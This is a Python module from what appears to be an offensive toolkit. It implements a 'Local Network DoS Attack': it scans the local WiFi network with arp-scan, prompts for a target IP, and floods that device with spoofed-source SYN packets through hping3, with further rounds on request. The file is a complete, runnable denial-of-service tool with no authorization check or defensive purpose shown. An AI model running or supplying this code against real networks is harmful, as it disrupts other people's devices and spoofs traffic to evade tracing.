"""
Local Network DoS Attack - Flood local devices on WiFi network
Uses arp-scan to discover devices and hping3 to flood them with packets
"""

import subprocess
import socket
import os
from ui.console import cprint, iprint, wprint, eprint, cinput


class LocalDoS:
    """Local Network Denial of Service Attack"""
    
    def __init__(self, interface="wlan0"):
        """
        Initialize LocalDoS attack
        
        Args:
            interface (str): WiFi interface to use (default: wlan0)
        """
        self.interface = interface
        self.target_ip = None
        self.running = False
    
    def discover_devices(self):
        """
        Scan local network to discover connected devices
        
        Returns:
            list: List of devices with IP and MAC addresses
        """
        try:
            iprint("Scanning local network for connected devices...")
            result = subprocess.run(
                ["sudo", "arp-scan", "--localnet"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode != 0:
                wprint("ARP scan failed. Make sure arp-scan is installed:")
                wprint("  sudo apt-get install arp-scan")
                return []
            
            devices = []
            lines = result.stdout.split('\n')
            
            # Parse arp-scan output
            for line in lines:
                if not line.strip() or '\t' not in line:
                    continue
                
                parts = line.split('\t')
                if len(parts) >= 2:
                    try:
                        ip = parts[0].strip()
                        mac = parts[1].strip()
                        # Basic IP validation
                        socket.inet_aton(ip)
                        devices.append({
                            'ip': ip,
                            'mac': mac,
                            'description': parts[2].strip() if len(parts) > 2 else "Unknown"
                        })
                    except (socket.error, IndexError):
                        continue
            
            return devices
        
        except FileNotFoundError:
            eprint("arp-scan not found. Install with:")
            eprint("  sudo apt-get install arp-scan")
            return []
        except subprocess.TimeoutExpired:
            eprint("Network scan timed out")
            return []
        except Exception as e:
            eprint(f"Error scanning network: {e}")
            return []
    
    def validate_ip(self, ip_address):
        """
        Validate IP address format
        
        Args:
            ip_address (str): IP to validate
            
        Returns:
            bool: True if valid IP, False otherwise
        """
        try:
            socket.inet_aton(ip_address)
            return True
        except socket.error:
            return False
    
    def display_devices(self, devices):
        """Display discovered devices to user"""
        if not devices:
            wprint("No devices found on network")
            return
        
        cprint("\n" + "="*70)
        cprint("Discovered Devices on Local Network:", "cyan")
        cprint("="*70)
        
        for i, device in enumerate(devices, 1):
            cprint(f"{i}. IP: {device['ip']:15} | MAC: {device['mac']:17} | {device['description']}")
        
        cprint("="*70 + "\n")
    
    def run_attack(self, target_ip, rounds=1):
        """
        Execute the DoS attack against target IP
        
        Args:
            target_ip (str): Target IP address
            rounds (int): Number of attack rounds
        """
        if not self.validate_ip(target_ip):
            eprint(f"Invalid IP address: {target_ip}")
            return False
        
        try:
            iprint(f"[*] Target IP: {target_ip}")
            iprint(f"[*] Interface: {self.interface}")
            iprint(f"[*] Preparing attack...\n")
            
            # Build hping3 command
            cmd = [
                "sudo", "hping3",
                "-I", self.interface,      # Interface
                "-S",                      # SYN packets
                target_ip,                 # Target IP
                "-p", "400",               # Port
                "--flood",                 # Flood mode (no delay)
                "--rand-source"            # Randomize source IP
            ]
            
            iprint("[*] Starting packet flood...")
            iprint("[!] Press Ctrl+C to stop\n")
            
            self.running = True
            
            # Run the attack
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            try:
                stdout, stderr = process.communicate(timeout=None)
                if stdout:
                    iprint(stdout)
                    
                iprint("\n[+] Attack completed!")
                return True
            
            except KeyboardInterrupt:
                wprint("\n[!] Attack interrupted by user")
                process.terminate()
                process.wait()
                return False
        
        except FileNotFoundError:
            eprint("hping3 not found. Install with:")
            eprint("  sudo apt-get install hping3")
            return False
        except PermissionError:
            eprint("Permission denied. This attack requires root privileges.")
            return False
        except Exception as e:
            eprint(f"Error during attack: {e}")
            return False
    
    def run_interactive(self):
        """Interactive mode for LocalDoS attack"""
        try:
            cprint("\n╔════════════════════════════════════╗", "cyan")
            cprint("║     Local Network DoS Attack        ║", "cyan")
            cprint("╚════════════════════════════════════╝\n", "cyan")
            
            # Discover devices
            devices = self.discover_devices()
            if not devices:
                eprint("No devices found on network")
                return
            
            # Display devices
            self.display_devices(devices)
            
            # Get target IP from user
            while True:
                target_ip = cinput("Enter target IP address")
                
                if not target_ip.strip():
                    wprint("IP address cannot be empty")
                    continue
                
                if not self.validate_ip(target_ip):
                    wprint(f"Invalid IP format: {target_ip}")
                    continue
                
                break
            
            # Confirm target
            cprint(f"\n[!] Target selected: {target_ip}", "yellow")
            confirm = cinput("Start attack? (Y/N)")
            
            if confirm.lower() != 'y':
                wprint("Attack cancelled")
                return
            
            # Run attack
            self.run_attack(target_ip)
            
            # Ask for another round
            while True:
                another = cinput("\nAnother round? (Y/N)")
                if another.lower() == 'y':
                    target_ip = cinput("Enter target IP address")
                    if self.validate_ip(target_ip):
                        self.run_attack(target_ip)
                    else:
                        wprint("Invalid IP address")
                else:
                    break
            
            iprint("\nLocalDoS attack session completed!")
        
        except KeyboardInterrupt:
            wprint("\n[!] Session interrupted by user")
        except Exception as e:
            eprint(f"Error: {e}")


def localdos(interface="wlan0"):
    """
    Standalone function to run LocalDoS attack
    
    Args:
        interface (str): WiFi interface to use
    """
    attack = LocalDoS(interface)
    attack.run_interactive()


if __name__ == "__main__":
    localdos()
